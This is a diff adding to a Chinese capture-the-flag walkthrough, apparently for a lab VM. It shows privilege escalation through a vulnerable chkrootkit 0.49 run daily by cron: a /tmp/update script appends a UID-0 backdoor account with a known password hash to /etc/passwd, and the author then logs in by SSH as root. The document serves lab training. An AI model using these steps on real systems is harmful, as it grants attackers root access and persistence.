@@ -233,9 +233,161 @@ VERSION_ID="12.04"
 
 Ubuntu 12.04.4 运行内核 3.11 32 位架构。searchsploit没有找到相关的提权漏洞。
 
+我们查看一下crontab这个计划任务
+
+```
+www-data@ubuntu:/$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+```
+
+查看cron作业
+
+```
+www-data@ubuntu:/etc$ ls -la cron.daily
+ls -la cron.daily
+total 72
+drwxr-xr-x  2 root root  4096 Apr 12  2016 .
+drwxr-xr-x 84 root root  4096 Dec 12  2023 ..
+-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
+-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
+-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
+-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
+-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
+-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
+-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
+-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
+-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
+-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
+-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
+-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
+-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
+```
+
+注意到chkrootkit和lighttpd这两个服务
+
+```
+┌──(root㉿kali)-[~/Desktop/test/SpyShell]
+└─# searchsploit chkrootkit    
+---------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                    |  Path
+---------------------------------------------------------------------------------- ---------------------------------
+Chkrootkit - Local Privilege Escalation (Metasploit)                              | linux/local/38775.rb
+Chkrootkit 0.49 - Local Privilege Escalation                                      | linux/local/33899.txt
+```
+
+chkrootkit存在一个本地权限提升的一个漏洞，我们将文件复制出来
+
+```
+┌──(root㉿kali)-[~/Desktop/test/SpyShell]
+└─# searchsploit -m linux/local/33899.txt
+  Exploit: Chkrootkit 0.49 - Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/33899
+     Path: /usr/share/exploitdb/exploits/linux/local/33899.txt
+    Codes: CVE-2014-0476, OSVDB-107710
+ Verified: True
+File Type: ASCII text
+Copied to: /root/Desktop/test/SpyShell/33899.txt
+```
+
+在`/tmp`目录中放置一个可执行文件，命名为'update'，其所有者为非root用户，以具有UID 0的用户（通常是root）身份运行chkrootkit。
+
+```
+The line 'file_port=$file_port $i' will execute all files specified in
+$SLAPPER_FILES as the user chkrootkit is running (usually root), if
+$file_port is empty, because of missing quotation marks around the
+variable assignment.
+
+Steps to reproduce:
+
+- Put an executable file named 'update' with non-root owner in /tmp (not
+mounted noexec, obviously)
+- Run chkrootkit (as uid 0)
+
+Result: The file /tmp/update will be executed as root, thus effectively
+rooting your box, if malicious content is placed inside the file.
+
+If an attacker knows you are periodically running chkrootkit (like in
+cron.daily) and has write access to /tmp (not mounted noexec), he may
+easily take advantage of this
+```
+
+为此，我们将附加`/etc/passwd`UID 和 GID 为 0 的行，从而有效地使我们的用户帐户成为第二个`root`帐户。首先，我们需要生成密码哈希。我将使用密码`pwn`：
+
+```
+openssl passwd pwn
+l1kaPwL6GGupI
+```
+
+现在我们将创建update脚本并使其可执行。
+
+非常重要：请确保附加到/etc/passwd操作>>。如果您使用该>操作符，您将完全覆盖该文件并破坏系统！
+
+```
+www-data@ubuntu:/var/www/test$ cd /tmp
+cd /tmp
+www-data@ubuntu:/tmp$ echo 'echo ori0n:l1kaPwL6GGupI:0:0:Your local hacker guy:/tmp:/bin/bash >> /etc/passwd' > update
+<0:0:Your local hacker guy:/tmp:/bin/bash >> /etc/passwd' > update
+www-data@ubuntu:/tmp$ cat update
+cat update
+echo ori0n:l1kaPwL6GGupI:0:0:Your local hacker guy:/tmp:/bin/bash >> /etc/passwd
+www-data@ubuntu:/tmp$ chmod 755 update
+chmod 755 update
+www-data@ubuntu:/tmp$ tail -n2 /etc/passwd
+tail -n2 /etc/passwd
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+ori0n:l1kaPwL6GGupI:0:0:Your local hacker guy:/tmp:/bin/bash
+```
+
+ssh登录&#x20;
+
+```
+┌──(root㉿kali)-[~/Desktop/test/SpyShell]
+└─# ssh ori0n@192.168.5.136
+ .oooooo..o  o8o            oooo          .oooooo.                 .o        .oooo.  
+d8P'    `Y8  `"'            `888         d8P'  `Y8b              o888      .dP""Y88b 
+Y88bo.      oooo   .ooooo.   888  oooo  888      888  .oooo.o     888            ]8P'
+ `"Y8888o.  `888  d88' `"Y8  888 .8P'   888      888 d88(  "8     888          .d8P' 
+     `"Y88b  888  888        888888.    888      888 `"Y88b.      888        .dP'    
+oo     .d8P  888  888   .o8  888 `88b.  `88b    d88' o.  )88b     888  .o. .oP     .o
+8""88888P'  o888o `Y8bod8P' o888o o888o  `Y8bood8P'  8""888P'    o888o Y8P 8888888888
+                                                                                     
+                                                                By @D4rk36
+ori0n@192.168.5.136's password: 
+Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+New release '14.04.4 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
 
 
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
 
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Mon Dec 11 22:59:59 2023 from 192.168.5.134
+root@ubuntu:/# cd /root
+root@ubuntu:/root# ls
+304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz  chkrootkit-0.49
+7d03aaa2bf93d80040f3f22ec6ad9d5a.txt                     newRule
+
+```
 
 [^1]: 
 
